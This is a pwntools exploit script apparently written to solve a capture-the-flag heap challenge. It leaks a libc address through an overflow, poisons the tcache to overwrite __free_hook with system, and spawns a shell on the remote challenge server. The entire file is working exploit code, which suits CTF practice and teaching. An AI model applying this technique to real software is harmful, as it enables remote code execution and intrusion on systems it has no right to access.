#!/usr/bin/env python3

from pwn import *

exe = ELF("./database_patched", checksec=False)
libc = ELF("./libc-2.27.so", checksec=False)
ld = ELF("./ld-2.27.so", checksec=False)

context.binary = exe
context.log_level = 'debug'

def insert(length, data):
    p.sendlineafter(b'choice => ', b'2')
    p.sendlineafter(b'length of string => ', '{}'.format(length).encode())
    p.sendafter(b'string you want to save => ', data)

def update(index, length, data):
    p.sendlineafter(b'choice => ', b'3')
    p.sendlineafter(b'index of element => ', '{}'.format(index).encode())
    p.sendlineafter(b'length of string => ', '{}'.format(length).encode())
    p.sendafter(b'string => ', data)

def remove(index):
    p.sendlineafter(b'choice => ', b'4')
    p.sendlineafter(b'index of element => ', '{}'.format(index).encode())

def show():
    p.sendlineafter(b'choice => ', b'1')

# p = process('./database_patched')
p = connect('binary.challs.pragyanctf.tech', 6004)

##########################
### Stage 1: Leak libc ###
##########################
insert(0x10, b'0'*0x10)
insert(0x420, b'a'*8)
insert(0x10, b'0'*0x10)

remove(1)

update(0, 0x50, b'0'*0x10)
show()

p.recvline()
main_arena_addr = u64(p.recvline()[37:37+8])
log.success("Main arena: " + hex(main_arena_addr))
libc.address = main_arena_addr - 0x3ebca0
log.success("Libc base: " + hex(libc.address))

##############################
### Stage 2: Tcache attack ###
##############################
insert(0x10, b'0'*0x10)
insert(0x10, b'0'*0x10)
insert(0x10, b'0'*0x10)
remove(4)
remove(3)

payload = b'1'*0x10
payload += flat(0, 0x21, libc.sym['__free_hook'])
update(1, 0x50, payload)

insert(0x10, b'/bin/sh\x00')
insert(0x10, p64(libc.sym['system']))

remove(3)

p.interactive()